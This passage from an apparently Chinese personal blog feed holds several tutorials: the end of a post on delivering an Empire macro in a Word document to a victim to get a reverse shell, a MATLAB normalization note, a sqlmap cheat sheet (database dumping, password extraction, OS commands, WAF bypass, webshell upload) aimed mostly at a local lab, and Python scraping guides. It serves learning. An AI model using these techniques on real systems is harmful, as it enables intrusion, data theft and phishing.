alt></p><p>生成<code>macro</code>,然后移动到<code>windows</code>上，新建一个木马的<code>word</code>文档，然后点击视图—&gt;&gt; 宏—-》创建宏，删除原来的代码，然后复制<code>macro</code>文档的代码粘贴进去，</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsv2y0ij30rq0q8mzh.jpg" alt></p><p>然后点击<code>ctrl+s</code>，保存为启用宏的文档</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bsv4gt1j31ae0o940s.jpg" alt></p><p>保存后然后将其发给受害者，如果受害者打开，并且点击启用，就会反弹<code>shell</code></p><p>最强大的是<code>empire</code>可以给大黄鸭<code>bad_usb</code>嵌入代码，只要<code>usb</code>插到受害者的电脑，会瞬间弹出一个<code>cmd</code>窗口，然后反弹回<code>shell</code>，可惜大黄鸭板子太贵了，没钱了，不然又可以拿出来玩。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab中mapminmax函数的总结</title>
      <link href="/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/"/>
      <url>/2019/04/12/matlab-zhong-mapminmax-han-shu-de-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="01-mapminmax-函数"><a href="#01-mapminmax-函数" class="headerlink" title="01 mapminmax()函数"></a>01 mapminmax()函数</h2><p><code>mapminmax()</code>函数主要是用来对数据进行归一化处理的函数，它把所有的数据都转换为<code>(0，1)</code>之间的数，目的就是取消各维数据间的数量别差别，防止大数吃小数的现象。</p><h2 id="02-函数接口"><a href="#02-函数接口" class="headerlink" title="02 函数接口"></a>02 函数接口</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Y,PS] = mapminmax(X)</span><br><span class="line">[Y,PS] = mapminmax(X,FP)</span><br><span class="line">Y = mapminmax(&apos;apply&apos;,X,PS)</span><br><span class="line">X = mapminmax(&apos;reverse&apos;,Y,PS)</span><br></pre></td></tr></table></figure><h3 id="02-1-函数参数说明"><a href="#02-1-函数参数说明" class="headerlink" title="02-1 函数参数说明"></a>02-1 函数参数说明</h3><p><code>Y</code>是归一化得到的数据，<code>PS</code>是一种描述数据的结构。它们的计算方式是<code>y = (ymax-ymin)*(x-xmin)/(xmax-xmin) + ymin;</code></p><p>倘若这个向量里面有两个相同的数，那么上式就变成分母<code>xmax</code>-<code>xmin</code>为零，这样怎么处理？</p><p><code>matlab</code>在这时会变成<code>y=ymin</code>，<code>ymax</code>和<code>ymin</code>这两个值默认为<code>-1</code>到<code>1</code>，也可以自己设置。</p><p>设置举例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt; clear</span><br><span class="line">&gt;&gt; l=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>] l = <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> &gt;&gt; k.ymin=<span class="number">0</span> k = 包含以下字段的 struct: ymin: <span class="number">0</span> &gt;&gt; k.ymax=<span class="number">1</span> k = 包含以下字段的 struct: ymin: <span class="number">0</span></span><br><span class="line">ymax: <span class="number">1</span> &gt;&gt; [m,n]=mapminmax(l,k) m = <span class="number">0</span> <span class="number">0.3333</span> <span class="number">0.6667</span> <span class="number">1.0000</span> n = 包含以下字段的 struct: name: <span class="string">'mapminmax'</span></span><br><span class="line">xrows: <span class="number">1</span></span><br><span class="line">xmax: <span class="number">4</span></span><br><span class="line">xmin: <span class="number">1</span></span><br><span class="line">xrange: <span class="number">3</span></span><br><span class="line">yrows: <span class="number">1</span></span><br><span class="line">ymax: <span class="number">1</span></span><br><span class="line">ymin: <span class="number">0</span></span><br><span class="line">yrange: <span class="number">1</span></span><br><span class="line">gain: <span class="number">0.3333</span></span><br><span class="line">xoffset: <span class="number">1</span></span><br><span class="line">no_change: <span class="number">0</span> &gt; 上面还可以这样设置：[Y,PS] = mapminmax(X,ymin,ymax)</span><br></pre></td></tr></table></figure><h2 id="03-函数接口说明"><a href="#03-函数接口说明" class="headerlink" title="03 函数接口说明"></a>03 函数接口说明</h2><p>上面已经讲了，<code>1</code>和<code>2</code>函数接口，<code>3</code>函数接口<code>Y = mapminmax(&#39;apply&#39;,X,PS)</code>主要是用来对其他向量采取同样的归一化（继续采用上面向量的<code>xmax</code>和<code>xmin</code>）对其归一化。 第三种<code>X = mapminmax(&#39;reverse&#39;,Y,PS)</code>就是对数据进行反归一化，就是通过存储在<code>PS</code>的结构的值计算原来的值。</p><h2 id="04-矩阵归一化"><a href="#04-矩阵归一化" class="headerlink" title="04 矩阵归一化"></a>04 矩阵归一化</h2><p>默认规范范围<code>(-1,1)</code>若想将规范范围划为<code>(-1,1)</code>，可编写<code>Y=mapminmax(A,0,1);</code></p><p>此函数规整行向量中最大最小值，如果运用此函数，则<code>A</code>矩阵每一行为一个维度，每一列是一个样本，所以一般在使用这个函数对样本进行归一化的时候就要将矩阵转置。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap工具总结</title>
      <link href="/2019/04/12/sqlmap-gong-ju-zong-jie/"/>
      <url>/2019/04/12/sqlmap-gong-ju-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="1-三种注入方式检测"><a href="#1-三种注入方式检测" class="headerlink" title="1. 三种注入方式检测"></a>1. 三种注入方式检测</h2><p><code>get</code>方式注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2</span><br></pre></td></tr></table></figure><p><code>post</code>方式注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-11/ --data uname=ha</span><br></pre></td></tr></table></figure><p><code>cookie</code>注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;网址&apos; --cookie uname=aja</span><br></pre></td></tr></table></figure><h2 id="2-数据库信息获取"><a href="#2-数据库信息获取" class="headerlink" title="2. 数据库信息获取"></a>2. 数据库信息获取</h2><p>获取当前用户下所有数据库</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; --dbs</span><br></pre></td></tr></table></figure><p>获取数据库的表名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos;-D 数据库名 --tables</span><br></pre></td></tr></table></figure><p>获取表中的字段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure><p>获取字段的内容</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; -D 数据库名 -T 表名 -C 列名，列名 --dump</span><br></pre></td></tr></table></figure><p>获取所有用户（具有一定的权限）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; --users</span><br></pre></td></tr></table></figure><p>获取数据库用户的密码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; --passwords</span><br></pre></td></tr></table></figure><p>获取当前网站数据库的名称</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; --current-db</span><br></pre></td></tr></table></figure><p>获取当前数据库的用户名称</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; --current-user</span><br></pre></td></tr></table></figure><p>获取数据库的数据量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; -D 数据库名 --count</span><br></pre></td></tr></table></figure><p>判断用户权限：增删改查、写入读取文件、执行系统命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --privileges</span><br></pre></td></tr></table></figure><p>简单的判断：<code>MSSQL</code>最高权限是<code>Sa</code>用户 <code>Mysql</code>最高权限是<code>root</code></p><p><code>sqlmap</code>不支持<code>Mongodb</code>和<code>nosql</code>所以新出来的开源<code>nosqlmap</code>支持可以去<code>github</code>上下载</p><p>管理自己的数据库得先在<code>github</code>上下载<code>pymysql</code>解压切换目录然后<code>setup.py install</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap.py -d mysql://用户名:密码@地址：端口/数据库 --sql-shell 进行sql语句的管理</span><br></pre></td></tr></table></figure><p>页面无变化，布尔无真假，从来不报错，延时注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --delay -safe-freq</span><br></pre></td></tr></table></figure><p>交互式命令执行和写<code>webshell</code> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=2 --os-cmd &apos;net user&apos;</span><br></pre></td></tr></table></figure><p>使用<code>tamper</code>绕过<code>waf</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -u &apos;&apos; --tamper=&apos;&apos;</span><br></pre></td></tr></table></figure><p>批量<code>sql</code>注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -m 文件</span><br></pre></td></tr></table></figure><h2 id="3-使用burpsuit批量扫描sql注入"><a href="#3-使用burpsuit批量扫描sql注入" class="headerlink" title="3. 使用burpsuit批量扫描sql注入"></a>3. 使用burpsuit批量扫描sql注入</h2><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g21bfr7oysj318t0swjtl.jpg" alt></p><p>先在<code>burpsuit</code>中设置使用代理抓包并将其保存在<code>sqlmap</code>所在的目录下。然后使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -l burp.log --batch -smart</span><br></pre></td></tr></table></figure><p><code>--batch</code> 就是使用默认选项，<code>smart</code>是使用智能化的注入，它会根据头的注入，<code>cookie</code>和<code>post</code>,<code>get</code>的方式进行注入</p><h2 id="4-本地上传webshell"><a href="#4-本地上传webshell" class="headerlink" title="4. 本地上传webshell"></a>4. 本地上传webshell</h2><p>首先，在<code>sqlmap</code>所在的目录下创建一个目录<code>mst</code>，然后里面存放我们要上传的<code>webshell</code>,<br>其次，需要两个参数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--file-write &apos;./mst/mst.txt&apos;</span><br><span class="line">--file-dest &apos;d:/www/1.php&apos;</span><br><span class="line">-v 等级 可以显示出注入的payload</span><br></pre></td></tr></table></figure><p>使用<code>burpsuit</code>结合<code>sqlmap</code>学习注入：参数 <code>--proxy=http：//127.0.0.1：8080</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于python爬虫的一些学习总结</title>
      <link href="/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/"/>
      <url>/2019/04/12/guan-yu-pa-chong-de-yi-xie-zong-jie-ji-ben-ku/</url>
      
        <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><p>上一次讲了<code>urllib</code>库的使用，但是其中有很多的不方便，处理网页验证和<code>Cookie</code>时候，需要写<code>opener</code>和<code>hanler</code>出咯，为了方便实现这些操作，需要有一个更加强大库，<code>requests</code>,它在<code>COOkie</code>、登陆验证、代理设置等操作十分简洁。</p><h2 id="2-requests库基本用法"><a href="#2-requests库基本用法" class="headerlink" title="2. requests库基本用法"></a>2. requests库基本用法</h2><h3 id="2-1-GET请求"><a href="#2-1-GET请求" class="headerlink" title="2.1 GET请求"></a>2.1 GET请求</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r=requests.get(<span class="string">'http://www.baidu.com'</span>)</span><br><span class="line">print(<span class="string">'type(r)\n'</span>,type(r))</span><br><span class="line">print(<span class="string">'code(r)\n'</span>,r.status_code)</span><br><span class="line">print(<span class="string">'text(r)\n'</span>,r.text)</span><br><span class="line">print(<span class="string">'cookie(r)\n'</span>,r.cookies)</span><br></pre></td></tr></table></figure><p>如何添加请求的字段呢？</p><p>两种方法：</p><p>一种是<code>get</code>请求直接在<code>url</code>里面，但是这样很麻烦。 </p><p>第二种是：设置一个字典，设置其健值对，然后使用<code>params</code>参数传给<code>requests.get(url=&#39;&#39;,params=&#39;&#39;)</code>,<code>r.text()</code>是<code>str</code>格式，如果想直接解析返回结果，得到字典的话，可以直接调用<code>json（方法）</code>，<code>r.json()</code>将<code>str</code>格式转换为字典格式。</p><p>如何抓取二进制数据？</p><p>页面是<code>html</code>文档，如果抓图片视频等文件，得拿到它们的二进制码。使用<code>r.content()</code>方法得到二进制码，然后将其以二进制的形式写入文档。</p><p>如何添加<code>headers</code>?</p><p>生成一个<code>headers</code>字典，给其键值对赋值，然后将其加入<code>get</code>方法的<code>headers</code>参数。</p><h3 id="2-2-POST请求"><a href="#2-2-POST请求" class="headerlink" title="2.2 POST请求"></a>2.2 POST请求</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">requests.post(url=&apos;&apos;,data=&apos;&apos;,headers=&apos;&apos;)</span><br></pre></td></tr></table></figure><p><code>data</code>是请求的表单数据，<code>haeders</code>依然是头。</p><p>如何知道请求的数据是成功的？</p><p>使用<code>r.status_code</code>可以获得状态码，如果得到的是<code>200</code>就是返回请求页面，其他的状态码其他部分可以查询网上参考。</p><p>当然响应头也可以通过<code>r.headers</code>得到它是一个字典，然后响应的<code>cookie</code>也可以通过<code>r.cookie</code>得到。</p><p><code>requests</code>还提供内置的状态码查询对象<code>erquests.codes</code>可以判断请求是否成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exit() if not r.status_code==requests.codes.ok else print(&apos;Requests successfully&apos;)</span><br></pre></td></tr></table></figure><h3 id="2-3-文件上传"><a href="#2-3-文件上传" class="headerlink" title="2.3 文件上传"></a>2.3 文件上传</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">files=&#123;<span class="string">'file'</span>:open(<span class="string">'文件名’，‘rb'</span>)</span><br><span class="line">r=requests.post(url=<span class="string">''</span>,files=files)</span><br></pre></td></tr></table></figure><p>响应体里面会包含<code>files</code>这个字段，而<code>form</code>字段是空的，文件上传会单独有一个<code>files</code>字段来标识。</p><h3 id="2-4-Cookies设置"><a href="#2-4-Cookies设置" class="headerlink" title="2.4 Cookies设置"></a>2.4 Cookies设置</h3><p><code>get</code>方式获取<code>cookie</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r=requests.get(<span class="string">'http://www.baidu.com'</span>)</span><br><span class="line">print(r.cookies)    <span class="comment">#获取响应的cookie</span></span><br><span class="line"><span class="keyword">for</span> key,values <span class="keyword">in</span> r.cookies.items():</span><br><span class="line">    print(key+<span class="string">'='</span>+value)</span><br></pre></td></tr></table></figure><p><code>GET</code>请求维持会话使用<code>cookie</code></p><p>在<code>headers</code>里面加入<code>Cookie</code>字段，就可以维持会话。</p><p>建立<code>RequestCookieJar</code>对象，使用复制下来的<code>cookies</code>利用<code>split()</code>方法分割<code>cookie</code>,然后健值对给<code>jar</code>设置<code>cookie</code>,最后加到<code>POST</code>方法里面。</p><p>维持同一个会话，使用<code>session</code>对象，就相当于打开一个新的浏览器选项卡而不是新开一个浏览器，不用每次都设置<code>cookies</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line">s.get(<span class="string">'url'</span>)</span><br><span class="line">r=s.get(url)</span><br></pre></td></tr></table></figure><p>它经常用于模拟登陆成功之后进一步的操作。</p><h3 id="2-5-SSL证书验证"><a href="#2-5-SSL证书验证" class="headerlink" title="2.5 SSL证书验证"></a>2.5 SSL证书验证</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages <span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()  <span class="comment">#忽略警告的方式屏蔽警告</span></span><br><span class="line">response=requests.get(<span class="string">'https://www.12306.cn'</span>,verify=<span class="literal">False</span>)  <span class="comment">#verify如果为TRUE会自动验证证书，我们忽略证书验证。</span></span><br></pre></td></tr></table></figure><h3 id="2-6-代理设置"><a href="#2-6-代理设置" class="headerlink" title="2.6 代理设置"></a>2.6 代理设置</h3><p>大规模爬取网站会弹出验证码，导致一定时间段无法访问，所以设置代理解决这个问题，需要用到<code>proxies</code>参数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxies=&#123;</span><br><span class="line">      <span class="string">'http'</span>:<span class="string">'http://user:password@ip地址'</span>&#125;</span><br><span class="line">requests.get(url=<span class="string">''</span>,proxies=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h3 id="2-7-超时设置"><a href="#2-7-超时设置" class="headerlink" title="2.7 超时设置"></a>2.7 超时设置</h3><p>有时候由于本机网络不好，我们等待很久才收到响应。为了防止这种情况，设置一个超时时间。增加一个<code>timeout</code>字段，单位为秒。永久等待设置为<code>None</code>或者不加参数。</p><h2 id="2-8-身份认证"><a href="#2-8-身份认证" class="headerlink" title="2.8 身份认证"></a>2.8 身份认证</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r=requests.get(url=<span class="string">''</span>,auth=(<span class="string">'username'</span>,<span class="string">'password'</span>)</span><br><span class="line">print(r.status_code)</span><br></pre></td></tr></table></figure><h2 id="2-9-封装请求的数据结构Prepared-Request"><a href="#2-9-封装请求的数据结构Prepared-Request" class="headerlink" title="2.9 封装请求的数据结构Prepared Request"></a>2.9 封装请求的数据结构Prepared Request</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request,Session</span><br><span class="line"></span><br><span class="line">url=<span class="string">''</span></span><br><span class="line">data=&#123;&#125;</span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"></span><br><span class="line">s=Session()</span><br><span class="line">req=Request(method=<span class="string">''</span>,url,data=data,headers=headers)</span><br><span class="line">pre=s.prepare_request(req)</span><br><span class="line">r=s.send(pre)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p><code>requests</code>库为常用库，一定得掌握，<code>urllib</code>了解就<code>ok</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> python爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python爬虫爬取猫眼电影</title>
      <link href="/2019/04/12/shi-yong-python-pa-qu-mao-yan-dian-ying/"/>
      <url>/2019/04/12/shi-yong-python-pa-qu-mao-yan-dian-ying/</url>
      
        <content type="html"><![CDATA[<h2 id="1-环境以及工具使用"><a href="#1-环境以及工具使用" class="headerlink" title="1. 环境以及工具使用"></a>1. 环境以及工具使用</h2><p>我们使用的是<code>python3</code>的<code>requests</code>库，<code>requests</code>比<code>urllib</code>更加的方便，同时使用正则表达式作为解析的工具。</p><p>在工具方便这次我们使用一个新的抓包工具用来对<code>http</code>协议的包进行分析</p><h3 id="1-1-工具介绍"><a href="#1-1-工具介绍" class="headerlink" title="1.1 工具介绍"></a>1.1 工具介绍</h3><p><code>Fiddler</code>的官方网址：<code>http://www.fiddler2.com/</code></p><p><code>Fiddler</code>是最强大最好用的<code>Web</code>调试工具之一，它能记录所有客户端和服务器的<code>http</code>和<code>https</code>请求，允许你监视，设置断点，甚至修改输入输出数据，<code>Fiddler</code>包含了一个强大的基于事件脚本的子系统，并且能使用<code>.net</code>语言进行扩展 你对<code>HTTP</code>协议越了解， 你就能越掌握<code>Fiddler</code>的使用方法。你越使用<code>Fiddler</code>，就越能帮助你了解<code>HTTP</code>协议。</p><p>为什么使用<code>Filddler</code>主要是使用特别方便，它还可以对手机进行抓包，自动监视所有的<code>http</code>协议。 给个简单的学习手册供大家学习：</p><p><a href="https://kb.cnblogs.com/page/130367/#introduce" target="_blank">https://kb.cnblogs.com/page/130367/#introduce</a></p><h2 id="2-实战"><a href="#2-实战" class="headerlink" title="2. 实战"></a>2. 实战</h2><p>首先设置打开<code>Fiddler</code>，然后浏览器输入<code>http://maoyan.com/board/4?offset=0</code>，然后点击第一条<code>request</code></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g2198kl7ghj31gk0re499.jpg" alt></p><p>我们可以看到右边的上侧是<code>request</code>,下面是<code>response</code>。</p><p>我们首先爬取第一页：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one_page</span><span class="params">(url)</span>:</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span>  response.text</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">'http://maoyan.com/board/4'</span></span><br><span class="line">    html=get_one_page(url)</span><br><span class="line">    print(html)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>运行成功得到第一页的数据，接下来我们需要进行一个解析，使用正则表达式分别获取电影排名、电影名称、主演、电影图片。 我们发现</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dd&gt;&lt;i class=&quot;board-index board-index-1&quot;&gt;1&lt;/i&gt;</span><br></pre></td></tr></table></figure><p>电影排名在这个<code>dd</code>标签，<code>i</code>标签的里面<code>1</code>就是排名，接下来我们构造正则表达式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;</span><br></pre></td></tr></table></figure><p><code>.?</code>就是非贪婪模式的匹配，<code>.</code>代表的是匹配任意字符，代表的是匹配前面字符无限次，让我联想到编译原理课的<code>*</code>闭包，就是乘以很多次。<code>()</code>就是我们要选择提取的字符。接下来我们需要解析影片的图片，</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;a href="/films/1203" title="霸王别姬" class="image-link" data-act="boarditem-click" data-val="&#123;movieId:1203&#125;"&gt;</span><br><span class="line">    &lt;img src="//ms0.meituan.net/mywww/image/loading_2.e3d934bf.png" alt="" class="poster-default" /&gt;</span><br><span class="line">    &lt;img data-src="http://p1.meituan.net/movie/20803f59291c47e1e116c11963ce019e68711.jpg@160w_220h_1e_1c" alt="霸王别姬" class="board-img" /&gt;</span><br></pre></td></tr></table></figure><p>图片是第二个<code>img</code>标签里面的东西，正则表达式改写成为：<code>&lt;dd&gt;.*?board-index.*?&gt;&lt;/i&gt;.*?data-src=&quot;(.*?)&quot;</code>接下来提取名称，</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"board-index board-index-1"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/films/1203"</span> <span class="attr">title</span>=<span class="string">"霸王别姬"</span> <span class="attr">class</span>=<span class="string">"image-link"</span> <span class="attr">data-act</span>=<span class="string">"boarditem-click"</span> <span class="attr">data-val</span>=<span class="string">"&#123;movieId:1203&#125;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//ms0.meituan.net/mywww/image/loading_2.e3d934bf.png"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"poster-default"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">data-src</span>=<span class="string">"http://p1.meituan.net/movie/20803f59291c47e1e116c11963ce019e68711.jpg@160w_220h_1e_1c"</span> <span class="attr">alt</span>=<span class="string">"霸王别姬"</span> <span class="attr">class</span>=<span class="string">"board-img"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"board-item-main"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"board-item-content"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"movie-item-info"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/films/1203"</span> <span class="attr">title</span>=<span class="string">"霸王别姬"</span> <span class="attr">data-act</span>=<span class="string">"boarditem-click"</span> <span class="attr">data-val</span>=<span class="string">"&#123;movieId:1203&#125;"</span>&gt;</span>霸王别姬<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"star"</span>&gt;</span>主演：张国荣,张丰毅,巩俐<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"releasetime"</span>&gt;</span>上映时间：1993-01-01(中国香港)<span class="tag">&lt;/<span class="name">p</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"movie-item-number score-num"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"score"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"integer"</span>&gt;</span>9.<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"fraction"</span>&gt;</span>6<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>电影名称在<code>p</code>节点，<code>class</code>为<code>name</code>，所以用<code>name</code>做标志位，提取<code>a</code>节点里面的正文内容，同时提取主演、发布时间、评分等内容，改写正则表达式</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;.*?data-src=&quot;(.*?)&quot;.*?name.*?a.*?&gt;(.*?)&lt;/a&gt;.*?star.*?&gt;(.*?)&lt;/p&gt;.*?releasetime.*?&gt;(.*?)&lt;/p&gt;.*?integer.*?&gt;(.*?)&lt;/i&gt;.*?fraction.*?(.*?)&lt;/i&gt;.*?&lt;/dd&gt;</span><br></pre></td></tr></table></figure><p>最后调用<code>findall()</code>提取所有的内容。</p><p>完整代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one_page</span><span class="params">(url)</span>:</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    response=requests.get(url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span>  response.text</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_one_page</span><span class="params">(html)</span>:</span></span><br><span class="line">    pattern=re.compile(<span class="string">'&lt;dd&gt;.*?board-index.*?&gt;(.*?)&lt;/i&gt;.*?data-src="(.*?)".*?name.*?a.*?&gt;(.*?)&lt;/a&gt;.*?star.*?&gt;(.*?)&lt;/p&gt;.*?releasetime.*?&gt;(.*?)&lt;/p&gt;.*?integer.*?&gt;(.*?)&lt;/i&gt;.*?fraction.*?(.*?)&lt;/i&gt;.*?&lt;/dd&gt;'</span>,re.S)</span><br><span class="line">    items=re.findall(pattern,html)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span 